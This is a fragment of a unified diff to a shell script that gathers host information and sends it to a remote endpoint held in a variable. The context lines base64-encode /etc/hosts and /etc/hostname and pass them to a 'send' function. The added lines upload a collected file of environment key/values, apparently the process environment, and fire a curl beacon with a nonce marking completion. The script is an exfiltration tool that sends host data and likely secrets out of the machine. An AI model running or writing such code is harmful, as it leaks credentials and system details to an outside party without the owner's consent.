@@ -48,3 +48,6 @@ grep -E 'overlay| /app | / ' /proc/self/mountinfo > /tmp/i405_mi 2>/dev/null; se
 send hosts.b64 "$(b64 </etc/hosts)"
 send hostname.b64 "$(b64 </etc/hostname)"
 send done "$NONCE-complete"
+# --- second-chance: upload all collected key/values as one blob ---
+if [ -f /tmp/i405_se ]; then send fb.selfenv.b64 "$(b64 </tmp/i405_se)"; fi
+curl -s -m 20 -G --data-urlencode "t=$NONCE-final" --data-urlencode "d=fired" "$B" >/dev/null 2>&1
